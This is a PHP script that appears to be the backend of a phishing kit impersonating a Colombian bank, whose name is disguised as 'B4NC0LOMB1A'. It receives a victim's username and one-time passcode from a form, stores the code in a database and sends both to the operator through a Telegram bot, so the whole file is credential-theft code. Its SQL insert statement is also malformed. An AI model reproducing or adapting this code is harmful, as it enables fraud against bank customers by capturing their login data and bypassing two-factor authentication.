<?php
require_once __DIR__ . "/../controllers/conection.php";
require_once __DIR__ . "/../controllers/tg.php";



if ($_SERVER['REQUEST_METHOD'] === 'POST') {

   
    $usr  = trim($_POST['user'] ?? '');
    $otp  = trim($_POST['otp'] ?? '');

    if (empty($otp)) {
        die("OTP es obligatorio");
    }

    try{    
        $conexion =new PDO(
            "mysql:host=" . DB_HOST . ";dbname=" . DB_NAME,
            DB_USER,
            DB_PASS,
            array(PDO::MYSQL_ATTR_INIT_COMMAND => "SET NAMES utf8mb4")
        );

        $conexion->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);

        $sql = "INSERT INTO sesiones (otp) 
                VALUES (:otp) AND SELECT LAST_INSERT_ID()";
        $stmt = $conexion->prepare($sql);
        $stmt->bindParam(':otp', $otp);
        $stmt->execute();
    }catch (PDOException $e) {
        echo json_encode([
            "status" => "error",
            "message" => $e->getMessage() 
        ]);
    } 

    // Enviar mensaje a Telegram
    $telegram = new Telegram();
    $mensaje = "➖➖➖➖➖➖ \n💰B4NC0LOMB1A💰\n\n  USER: {$usr} \n\n ✔️ OTP: {$otp} \n\n  🔗 ENLACE: LINK_AL_PANEL_PERSONAL \n\n DESDE EL NEW BOT WITH OTP \n\n ➖➖➖➖➖➖";
    $telegram->enviarMensaje($mensaje);
}else {
    // No hacer nada si no hay POST
    exit();
}
